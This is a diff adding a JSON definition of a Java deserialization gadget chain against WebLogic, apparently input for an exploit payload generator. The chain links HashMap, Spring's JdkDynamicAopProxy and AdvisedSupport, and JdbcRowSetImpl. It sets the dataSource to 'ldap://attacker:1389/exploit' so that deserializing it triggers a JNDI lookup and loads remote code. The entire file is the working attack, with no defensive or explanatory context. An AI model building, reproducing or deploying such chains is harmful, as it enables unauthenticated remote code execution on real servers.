@@ -1,0 +1,27 @@
+{
+  "chain_type": "Post-PSU: HashMap → JdkDynamicAopProxy → AdvisedSupport → JNDI",
+  "root_class": "java.util.HashMap",
+  "root_trigger": "readObject→putVal→hash→Proxy.hashCode→JdkDynamicAopProxy.invoke→AdvisedSupport",
+  "links": [
+    {
+      "class": "com.bea.core.repackaged.springframework.aop.framework.JdkDynamicAopProxy",
+      "field_overrides": {
+        "advised": {"$ref": "link:1"}
+      }
+    },
+    {
+      "class": "com.bea.core.repackaged.springframework.aop.framework.AdvisedSupport",
+      "field_overrides": {
+        "targetSource": {"$ref": "link:2"},
+        "advisorChainFactory": null
+      }
+    },
+    {
+      "class": "com.sun.rowset.JdbcRowSetImpl",
+      "field_overrides": {
+        "dataSource": "ldap://attacker:1389/exploit"
+      }
+    }
+  ],
+  "sink_method": "JdkDynamicAopProxy→AdvisedSupport→JNDI"
+}
